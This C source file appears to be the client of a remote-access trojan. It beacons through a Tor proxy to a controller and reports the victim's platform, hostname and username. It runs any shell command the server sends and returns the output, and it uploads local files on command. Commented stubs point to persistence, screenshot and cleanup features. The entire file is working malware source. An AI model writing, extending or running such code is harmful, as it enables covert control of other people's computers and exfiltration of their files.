#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <sys/time.h>
#include <curl/curl.h>
#include <unistd.h>
#include <pthread.h>

#define BUFFER_SIZE 256

struct url_data {
    size_t size;
    char* data;
};
enum PostType {json = 0,
               file = 1,
               string = 2};

char *UID;
char *PLATFORM;
char *HOSTNAME;
char *USERNAME;
const char *URL;
const char *URL_TOR;
int FAILED_COUNT;
bool IDLE;
int IDLE_TIME;
int INTERVAL;
long TIME_LAST_ACTIVE;

/* ----------------------------------------------------------------------- *
*  Utility
* ------------------------------------------------------------------------ */
char* fileToString(char* file_name)
{
    FILE *file = fopen(file_name, "r");
    fseek(file, 0, SEEK_END);
    long length = ftell(file);
    fseek(file, 0, SEEK_SET);
    char *buffer = malloc(sizeof(char) * (length + 1));
    buffer[length] = '\0';
    fread(buffer, sizeof(char), length, file);
    fclose(file);
    return buffer;
}
char* get_command(char* todo)
{
    char *todo_temp = malloc(BUFFER_SIZE);
    strcpy(todo_temp,todo);
    char *token = strtok(todo_temp, " ");
    while (token != NULL)
    {
        return token;
    }
    return todo_temp;
}

char* get_args(char* todo)
{
    char *todo_temp = malloc(strlen(todo)+1);
    strcpy(todo_temp,todo);
    const char ch = ' ';
    char *ret;
    ret = strchr(todo_temp, ch);
    ret++;
    return ret;
}

int get_args_len(char* todo)
{
    char *todo_temp = malloc(BUFFER_SIZE);
    strcpy(todo_temp,todo);
    char *token = strtok(todo_temp, " ");
		int count = 0;
    while (token != NULL)
    {
        count++;
        token = strtok(NULL, " ");
    }
    return count - 1;
}

void succeeded_request()
{
    FAILED_COUNT = 0;
}

void failed_request(const char *error)
{
    FAILED_COUNT++;
    fprintf(stdout,"%s\nConsecutive failed connections: %d\n\n"
            ,error,FAILED_COUNT);
}

char* get_unique_id()
{
    char *uid = malloc(BUFFER_SIZE);
    sprintf(uid,"%s_%d",USERNAME,getuid());
    return uid;
}

long get_time()
{
    time_t current_time;
    time(&current_time);
    return current_time;
}


/* ----------------------------------------------------------------------- *
*  Request Wrapper
* ------------------------------------------------------------------------ */
size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
    size_t index = data->size;
    size_t n = (size * nmemb);
    char* tmp;
    data->size += (size * nmemb);
    tmp = realloc(data->data, data->size + 1);
    if(tmp){
        data->data = tmp;
    }
    else
    {
        if(data->data)
        {
            free(data->data);
        }
        fprintf(stderr, "Failed to allocate memory.\n");
        return 0;
    }
    memcpy((data->data + index), ptr, n);
    data->data[data->size] = '\0';
    return size * nmemb;
}

char* get_request(char *path)
{
    CURL *curl;
    CURLcode res;
    struct url_data data;
    data.size = 0;
    data.data = malloc(BUFFER_SIZE);
    if(data.data == NULL) {
        fprintf(stderr, "Failed to allocate memory.\n");
        return NULL;
    }
    curl = curl_easy_init();
    if(curl) {
        char url[BUFFER_SIZE];
        strcpy(url, URL);
        strcat(url, path);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
        else succeeded_request();
        curl_easy_cleanup(curl);
    }
    return data.data;
}

char* post_request(char *path, char *post_data, enum PostType type)
{
    CURL *curl;
    CURLcode res;
    struct url_data data;
    data.size = 0;
    data.data = malloc(BUFFER_SIZE);
    if(data.data == NULL) {
        fprintf(stderr, "Failed to allocate memory.\n");
        return NULL;
    }
    curl = curl_easy_init();
    if(curl) {
        char url[BUFFER_SIZE];
        strcpy(url, URL);
        strcat(url, path);
        struct curl_slist *headers = NULL;
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
        if(type == json)
        {
            headers = curl_slist_append(headers, "Accept: application/json");
            headers = curl_slist_append(headers, "Content-Type: application/json");
            headers = curl_slist_append(headers, "charset: utf-8");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        }
        else if(type == string)
        {
            char *escaped_post_data = curl_easy_escape(curl, post_data, strlen(post_data));
            char *final_post_data = malloc(strlen(escaped_post_data) + BUFFER_SIZE);
            sprintf(final_post_data,"output=%s",escaped_post_data);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, final_post_data);
            curl_free(escaped_post_data);
        }
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
        else succeeded_request();
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    return data.data;
}

char* upload_request(char *path, char *filename)
{
    CURL *curl;
    CURLM *multi_handle;
    int still_running = 0;
    struct curl_httppost *formpost = NULL;
    struct curl_httppost *lastptr = NULL;
    struct curl_slist *headerlist = NULL;
    curl_formadd(&formpost,
                 &lastptr,
                 CURLFORM_COPYNAME, "sendfile",
                 CURLFORM_FILE, filename,
                 CURLFORM_END);
    curl_formadd(&formpost,
                 &lastptr,
                 CURLFORM_COPYNAME, "filename",
                 CURLFORM_COPYCONTENTS, filename,
                 CURLFORM_END);
    curl_formadd(&formpost,
                 &lastptr,
                 CURLFORM_COPYNAME, "submit",
                 CURLFORM_COPYCONTENTS, "send",
                 CURLFORM_END);
    curl = curl_easy_init();
    multi_handle = curl_multi_init();
    struct curl_slist *headers = NULL;
    if(curl && multi_handle)
    {
        char url[BUFFER_SIZE];
        strcpy(url, URL);
        strcat(url, path);
        headers = curl_slist_append(headers, "Content-Type: multipart/form-data;");
        headers = curl_slist_append(headers, "Expect: ");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
        curl_multi_add_handle(multi_handle, curl);
        curl_multi_perform(multi_handle, &still_running);
        while(still_running)
        {
            struct timeval timeout;
            int rc;
            CURLMcode mc;
            fd_set fdread;
            fd_set fdwrite;
            fd_set fdexcep;
            int maxfd = -1;
            long curl_timeo = -1;
            FD_ZERO(&fdread);
            FD_ZERO(&fdwrite);
            FD_ZERO(&fdexcep);
            timeout.tv_sec = 1;
            timeout.tv_usec = 0;
            curl_multi_timeout(multi_handle, &curl_timeo);
            if(curl_timeo >= 0)
            {
                timeout.tv_sec = curl_timeo / 1000;
                if(timeout.tv_sec > 1)
                    timeout.tv_sec = 1;
                else
                    timeout.tv_usec = (curl_timeo % 1000) * 1000;
            }
            mc = curl_multi_fdset(multi_handle, &fdread, &fdwrite, &fdexcep, &maxfd);
            if(mc != CURLM_OK)
            {
                fprintf(stderr, "curl_multi_fdset() failed, code %d.\n", mc);
                break;
            }
            if(maxfd == -1)
            {
#ifdef _WIN32
                Sleep(100);
                rc = 0;
#else
                struct timeval wait = { 0, 100 * 1000 };
                rc = select(0, NULL, NULL, NULL, &wait);
#endif
            }
            else
            {
                rc = select(maxfd + 1, &fdread, &fdwrite, &fdexcep, &timeout);
            }
            switch(rc)
            {
                case -1:
                    break;
                case 0:
                default:
                    curl_multi_perform(multi_handle, &still_running);
                    break;
            }
        }
        curl_multi_cleanup(multi_handle);
        curl_easy_cleanup(curl);
        curl_formfree(formpost);
        curl_slist_free_all(headerlist);
    }
    return 0;
}

/* ----------------------------------------------------------------------- *
*  Action Threads
* ------------------------------------------------------------------------ */
void send_output(char* output, bool newlines)
{
    char *output_temp = malloc(strlen(output)+BUFFER_SIZE);
    if(output!= NULL && output[0] == '\0') return;
    if(newlines)
    {
        strcpy(output_temp,output);
        strcat(output_temp,"\n\n");
    }
    else strcpy(output_temp,output);
    char *path = malloc(BUFFER_SIZE);
    sprintf(path, "/api/%s/report", get_unique_id());
    post_request(path, output_temp, string);

}
char* say_hello()
{
    char *path = malloc(BUFFER_SIZE);
    char *post_data = malloc(BUFFER_SIZE);
    sprintf(path, "/api/%s/hello", get_unique_id());
    sprintf(post_data,
            "{\"platform\": \"%s\",\
             \"hostname\": \"%s\",\
             \"username\": \"%s\"}",
            PLATFORM,HOSTNAME,USERNAME);
    return post_request(path, post_data, json);
}

void* upload(void* input)
{
    char *filepath = realpath(input,NULL);
    if(filepath == NULL)
    {
        send_output("[!] No such file",true);
        pthread_exit(NULL);
    }
    else
    {
        send_output("[*] Uploading ...",true);
        char *path = malloc(BUFFER_SIZE);
        sprintf(path, "/api/%s/upload", get_unique_id());
        upload_request(path, input);
    }
    pthread_exit(NULL);
}

void* do_command(void* input)
{
    char* instruction = " 2>&1";
    char* command = malloc(strlen(input) + strlen(instruction) + BUFFER_SIZE);
    sprintf(command, "%s %s",input, instruction);
    printf("%s\n",command);
    char buffer[BUFFER_SIZE*2];
    size_t buffer_size = BUFFER_SIZE*2;
    char *output = malloc(BUFFER_SIZE*2);
    FILE *f = popen(command, "r");
    if(f == NULL)
    {
        send_output("[!] Unable to popen command", true);
        pthread_exit(NULL);
    }
    while(fgets(buffer, sizeof(buffer), f) != NULL) {
        if(strlen(output) >= buffer_size-300)
        {
            buffer_size = buffer_size + BUFFER_SIZE*2;
            output = realloc(output, buffer_size);
        }
        strcat(output, buffer);
    }
    output = realloc(output, strlen(output) + BUFFER_SIZE);
    strcat(output,"\n\n");
    pclose(f);
    send_output(output, true);
    pthread_exit(NULL);
}

/* ----------------------------------------------------------------------- *
*  Main Function
* ------------------------------------------------------------------------ */
void setup()
{
    UID = malloc(BUFFER_SIZE);
    PLATFORM = malloc(BUFFER_SIZE);
    HOSTNAME = malloc(BUFFER_SIZE);
    USERNAME = malloc(BUFFER_SIZE);
    FAILED_COUNT = 0;
    IDLE = true;
    IDLE_TIME = 60;
    INTERVAL = 3;
    TIME_LAST_ACTIVE = get_time();
    if(getenv("URL") == NULL || getenv("URL_TOR") == NULL)
    {
        fprintf(stderr, "[!] No Path Variable Set");
        exit(0);
    }
    URL = getenv("URL");
    URL_TOR = getenv("URL_TOR");
#if __APPLE__
        PLATFORM = "MAC OS";
        gethostname(HOSTNAME, BUFFER_SIZE);
        getlogin_r(USERNAME, BUFFER_SIZE);
#elif _WIN32
        PLATFORM = "WINDOWS";
        GetComputerName(USERNAME, BUFFER_SIZE);
        GetComputerName(USERNAME, BUFFER_SIZE);
        INTERVAL = 3 * 100;
#elif __LINUX__
        PLATFORM = "LINUX";
        gethostname(HOSTNAME, BUFFER_SIZE);
        getlogin_r(USERNAME, BUFFER_SIZE);
#else
        PLATFORM = "NONE";
#endif
}

void run()
{
    char *todo = malloc(BUFFER_SIZE*2);
    char *output = malloc(BUFFER_SIZE);
    while(1){
        todo = say_hello();
        if(!(todo!= NULL && todo[0] == '\0'))
        {
            IDLE = false;
            TIME_LAST_ACTIVE = get_time();
            sprintf(output,"$ %s",todo);
            send_output(output, true);
            char *command = get_command(todo);
            int args_len = get_args_len(todo);
            pthread_t tid;
            if(strcmp("cd",command) == 0)
            {
                if(args_len == 0)
                    send_output("Usage: cd </path/to/directory>",true);
                else
                    chdir(get_args(todo));
            }
            else if(strcmp("upload",command) == 0)
            {
                if(args_len == 0)
                    send_output("Usage: upload <localfile>",true);
                else
                    pthread_create(&tid, NULL, upload, get_args(todo));
            }
/*
            else if(strcmp("download",command) == 0)
            {

            }
            else if(strcmp("clean",command) == 0)
            {

            }
            else if(strcmp("persist",command) == 0)
            {

            }
            else if(strcmp("exit",command) == 0)
            {

            }
            else if(strcmp("zip",command) == 0)
            {

            }
            else if(strcmp("screenshot",command) == 0)
            {

            }
*/
            else
            {
                pthread_create(&tid, NULL, do_command, todo);
            }
        }
        else
        {
            if(IDLE) sleep(INTERVAL);
            else if (get_time() - TIME_LAST_ACTIVE > IDLE_TIME) IDLE = true;
            else sleep(1);
        }
    }
}

int main()
{
    setup();
    run();
    return 0;
}
